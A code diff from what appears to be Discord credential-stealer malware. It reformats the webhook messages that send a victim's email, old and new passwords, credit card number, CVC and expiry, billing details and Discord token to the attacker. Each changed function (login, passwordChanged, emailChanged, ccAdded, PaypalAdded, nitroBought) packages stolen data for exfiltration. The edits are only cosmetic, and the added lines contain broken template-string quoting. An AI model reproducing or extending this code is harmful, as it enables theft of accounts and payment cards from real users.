@@ -663,16 +663,16 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info**',
-            value: `📧 Email: **${email}** - 🔒 Password: **${password}**`,
+            value: `<:Phone:1080852884696076379> Email: `${email}` - <:pass:1080879020348035083> Password: `${password}``,
             inline: false,
           },
           {
             name: '**Discord Info**',
-            value: `🚀 Nitro Type: **${nitro}**\n🎖️ Badges: **${badges}**\n💵 Billing: **${billing}**`,
+            value: `<a:nitroboost:996004213354139658> Nitro Type: `${nitro}`\n<:badge:1080881734821871626> Badges: `${badges}`\n<:Billing:1080850651023687791> Billing: `${billing}``,
             inline: false,
           },
           {
-            name: '🎌 **Token**',
+            name: '<:token:825533670356942879> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -702,16 +702,16 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `📧 Email: **${json.email}**\n🔓 Old Password: **${oldpassword}**\n🔒 New Password: **${newpassword}**`,
+            value: `<:Phone:1080852884696076379> Email: `${json.email}`\n<:pass:1080879020348035083> Old Password: `${oldpassword}`0\n<:pass:1080879020348035083> New Password: `${newpassword}``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `🚀 Nitro Type: **${nitro}**\n🎖️ Badges: **${badges}**\n💵 Billing: **${billing}**`,
+            value: `<a:nitroboost:996004213354139658> Nitro Type: `${nitro}`\n<:badge:1080881734821871626> Badges: `${badges}`\n<:Billing:1080850651023687791> Billing: `${billing}``,
             inline: true,
           },
           {
-            name: '🎌 **Token**',
+            name: '<:token:825533670356942879> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -741,16 +741,16 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `📧 New Email: **${email}**\n🔒 Password: **${password}**`,
+            value: `<:Phone:1080852884696076379> New Email: `${email}`\n<:pass:1080879020348035083> Password: `${password}``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `🚀 Nitro Type: **${nitro}**\n🎖️ Badges: **${badges}**\n💵 Billing: **${billing}**`,
+            value: `<a:nitroboost:996004213354139658> Nitro Type: `${nitro}`\n<:badge:1080881734821871626> Badges: `${badges}`\n<:Billing:1080850651023687791> Billing: `${billing}``,
             inline: true,
           },
           {
-            name: '🎌 **Token**',
+            name: '<:token:825533670356942879> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -785,11 +785,11 @@ const PaypalAdded = async (token) => {
           },
           {
             name: '**Discord Info**',
-            value: `🚀 Nitro Type: **${nitro}**\n🎖️ Badges: **${badges}**\n💵 Billing: **${billing}**`,
+            value: `<a:nitroboost:996004213354139658> Nitro Type: `${nitro}`\n<:badge:1080881734821871626> Badges: `${badges}`\n<:Billing:1080850651023687791> Billing: `${billing}``,
             inline: false,
           },
           {
-            name: '🎌 **Token**',
+            name: '<:token:825533670356942879> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -819,16 +819,16 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         fields: [
           {
             name: '**Credit Card Added**',
-            value: `💳 Credit Card Number: **${number}**\n💳 CVC: **${cvc}**\n💳 Credit Card Expiration: **${expir_month}/${expir_year}**`,
+            value: `💳 Credit Card Number: `${number}`\n💳 CVC: `${cvc}`\n💳 Credit Card Expiration: `${expir_month}/${expir_year}``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `🚀 Nitro Type: **${nitro}**\n🎖️ Badges: **${badges}**\n💵 Billing: **${billing}**`,
+            value: `<a:nitroboost:996004213354139658> Nitro Type: `${nitro}`\n<:badge:1080881734821871626> Badges: `${badges}`\n<:Billing:1080850651023687791> Billing: `${billing}``,
             inline: true,
           },
           {
-            name: '🎌 **Token**',
+            name: '<:token:825533670356942879> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -860,16 +860,16 @@ const nitroBought = async (token) => {
         fields: [
           {
             name: '**Nitro bought!**',
-            value: `🚀 **Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            value: `<a:nitroboost:996004213354139658> **Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `🚀 Nitro Type: **${nitro}**\n🎖️ Badges: **${badges}**\n💵 Billing: **${billing}**`,
+            value: `<a:nitroboost:996004213354139658> Nitro Type: `${nitro}`\n<:badge:1080881734821871626> Badges: `${badges}`\n<:Billing:1080850651023687791> Billing: `${billing}``,
             inline: true,
           },
           {
-            name: '🎌 **Token**',
+            name: '<:token:825533670356942879> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
